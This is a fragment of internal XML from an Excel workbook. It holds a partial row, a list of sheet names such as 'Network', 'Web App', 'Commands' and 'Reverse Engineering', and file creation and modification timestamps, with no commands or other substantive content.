    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.3">
      <c r="D3"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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc</vt:lpstr>
      <vt:lpstr>Reverse Engineering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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-24T12:42:23Z</dcterms:modified>
</cp:coreProperties>
</file>